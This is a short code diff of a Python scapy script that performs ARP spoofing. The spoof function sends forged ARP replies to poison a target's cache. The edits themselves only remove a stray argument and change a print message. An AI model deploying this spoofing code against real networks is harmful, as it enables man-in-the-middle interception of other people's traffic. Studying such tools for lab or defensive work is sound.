@@ -13,7 +13,7 @@ def getMac(ip):
 
 def spoof(targetIP, spoofIP):
     targetMac = getMac(targetIP)
-    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMac, psrc=spoofIP, verbose=False)
+    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMac, psrc=spoofIP)
     scapy.send(packet, verbose=False)
     
 packetsCount = 0    
@@ -29,4 +29,4 @@ try:
         
         time.sleep(1)
 except KeyboardInterrupt:
-    print("[+] Quitting")
+    print("[+] Quitting.")
